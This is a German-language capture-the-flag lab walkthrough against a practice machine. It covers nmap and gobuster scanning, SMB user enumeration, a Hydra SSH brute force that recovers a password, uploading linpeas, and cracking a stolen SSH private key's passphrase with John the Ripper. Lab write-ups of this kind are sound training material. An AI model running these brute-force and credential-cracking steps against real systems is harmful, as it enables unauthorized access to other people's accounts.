# ZIEL IP: 10.10.2.137

# Scanning
## NMAP 

22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

139/tcp  open  netbios-ssn Samba smbd 4.6.2

445/tcp  open  netbios-ssn Samba smbd 4.6.2

8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS

8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7

MAC Address: 02:2E:C0:97:36:1B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7


# Enumeration 

## gobuster 

Findings:
	/development

# Weiteres Vorgehen?
Kontrolle des /development Verzeichniss 
- Beinhaltet 2 txt datein 
- Info das es User -k und user -J gibt
- struts Version  2.5.12 (Open-Source-Framework für die Entwicklung von Java-Webanwendungen)
- Anscheinend hat J ein schwaches Passwort

Kontrolle des SMB Shares 
- Enumeration des SMB shares
	- Herausfinden vorhandener ordner via `smbclient -L //10.10.2.137/ -U '' -N`
		- IPC disk gefunden
	- Enumeration via enum4linux `enum4linux -a 10.10.2.137
		- Resultat User gefunden "kay" und User "jan"

Bruteforcing User Jan SSH?
- via Hydra `hydra -l jan -P /usr/share/wordlist/rockyouötxt 10.10.2.137 ssh`
- ERFOLG SSH Password für jan ist armando

# Privilegien Ausweiten
## Enumeration
via Linpeas
übertragen auf Ziel maschine via SCP

```
scp /desktop/linpeas.sh jan@10.10.118.192:/dev/shm
```

Habe es in shm (Shared Memory) geschoben falls weitere verwendung durch andere User bedarf
- chmod +x nicht vergessen


Findings Private SSH Key from Kay
anlegen als kay_id_rsa (auf attackbox) und zugriff ändern auf 600 (ssh keys müssen so angelegt sein)

Verbinden via des keys 

```
ssh -i kay_id_rsa kay@10.10.118.192
```

-> Ist PW gesichert 
	-> Versuch mit John the Ripper zu knacken 
	- umwandeln via ssh2john 
	-> `python3 ssh2john kay_id_rsa > hash.txt`
	- Knacken via
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
CREDS GEFUNDEN 
PW für den Key ist `beeswax`

-> abrufen der Datei im Home -> Letzte Flag Gefunden